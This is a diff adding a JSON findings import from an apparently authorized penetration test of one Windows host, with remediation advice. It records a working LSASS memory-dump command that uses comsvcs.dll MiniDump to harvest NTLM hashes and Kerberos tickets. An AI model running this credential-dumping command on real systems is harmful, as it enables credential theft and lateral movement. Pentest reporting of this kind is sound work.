@@ -1,0 +1,50 @@
+{
+  "_recce_import": 1,
+  "source": "fieldkit",
+  "engagement": {
+    "client": "ACME",
+    "assessor": "",
+    "date": "2026-07-29",
+    "scope": "Authorized internal penetration test \u2014 access, lateral movement and local privilege escalation.",
+    "targets": [
+      "10.0.0.7 (WS02, windows)"
+    ],
+    "capture_method": "Every command fieldkit ran against a target was captured verbatim (command, output and exit code) in the engagement database as it executed.",
+    "evidence_log": "e.db"
+  },
+  "findings": [
+    {
+      "title": "SeDebug \u2192 dump LSASS",
+      "vector_type": "lsass",
+      "affected_host": "10.0.0.7 (WS02, windows)",
+      "ip": "10.0.0.7",
+      "hostname": "WS02",
+      "proven": true,
+      "evidence": "Dump complete.",
+      "references": "",
+      "steps": [
+        {
+          "cmd": "powershell -c \"rundll32 C:\\windows\\system32\\comsvcs.dll MiniDump (Get-Process lsass).Id C:\\Windows\\Temp\\l.dmp full\"",
+          "output": "Dump complete.",
+          "transport": null
+        }
+      ],
+      "artifacts": [],
+      "_recce": {
+        "ip": "10.0.0.7",
+        "hostname": "WS02",
+        "port": null,
+        "severity": "high",
+        "cwe": "CWE-522",
+        "cwes": [
+          "CWE-522"
+        ],
+        "remediation": "Enable LSASS as a protected process (RunAsPPL) and/or Credential Guard; restrict SeDebugPrivilege; deploy EDR to detect memory access to LSASS.",
+        "description": "LSASS process memory was dumped (e.g. via comsvcs.dll MiniDump) and parsed offline to recover NTLM hashes and/or Kerberos tickets.",
+        "risk": "read-only",
+        "confidence": "confirmed",
+        "ids": []
+      }
+    }
+  ]
+}
